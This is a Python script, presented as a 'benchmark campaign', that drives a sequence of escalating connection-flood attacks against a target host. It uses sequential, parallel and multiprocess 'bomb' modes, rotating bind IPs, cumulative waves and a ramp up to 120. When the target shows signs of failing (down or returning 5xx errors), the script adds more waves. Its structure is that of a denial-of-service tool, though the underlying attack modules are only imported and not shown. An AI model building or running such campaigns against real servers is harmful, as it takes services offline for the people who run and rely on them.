"""Multi-strategy full benchmark campaign."""
from __future__ import annotations

import time

from attack_runner import run_attack
from campaigns.multiprocess import run_multiprocess
from campaigns.waves import run_cumulative_waves, run_ramp
from paths import CSV_PATH, DEFAULT_PORT, JSONL_PATH


def run_full_campaign(host: str, bind_ips: list[str | None] | None = None) -> None:
    bind_default = bind_ips or [None]
    print("=== CAMPAIGN START ===", flush=True)
    strategies = [
        ("burst_seq_20", 20, "sequential", 120),
        ("burst_seq_35", 35, "sequential", 180),
        ("burst_seq_50", 50, "sequential", 180),
        ("burst_par_25", 25, "parallel", 120),
        ("multiprocess_50", 0, "multiprocess", 300),
        ("burst_seq_60", 60, "sequential", 240),
        ("multiprocess_75", 0, "multiprocess", 300),
        ("burst_seq_80", 80, "sequential", 240),
        ("multiprocess_100", 0, "multiprocess", 360),
    ]
    for name, n, mode, hold in strategies:
        print(f"\n=== STRATEGY {name} ===", flush=True)
        if mode == "multiprocess":
            count = int(name.split("_")[1])
            result = run_multiprocess(host, count, hold=hold, stagger=0.4)
        else:
            result = run_attack(
                name, host, DEFAULT_PORT, n,
                hold=hold, drip=25, bomb_mode=mode, bind_ips=bind_default,
            )
        if result and (result.server_down or (result.probe_after.http_code or 0) >= 500):
            print("Server degraded — extra cumulative waves", flush=True)
            run_cumulative_waves(host, 50, stagger=1, hold=300)
        time.sleep(25)

    print("\n=== CUMULATIVE 60 WAVES ===", flush=True)
    run_cumulative_waves(host, 60, wave_size=5, stagger=1, hold=300)

    print("\n=== RAMP 50-120 ===", flush=True)
    run_ramp(host, [50, 70, 90, 110, 120], hold=180, drip=20, bind_ips=bind_default)

    print("\n=== CAMPAIGN DONE ===", flush=True)
    print(f"Logs: {CSV_PATH} | {JSONL_PATH}", flush=True)
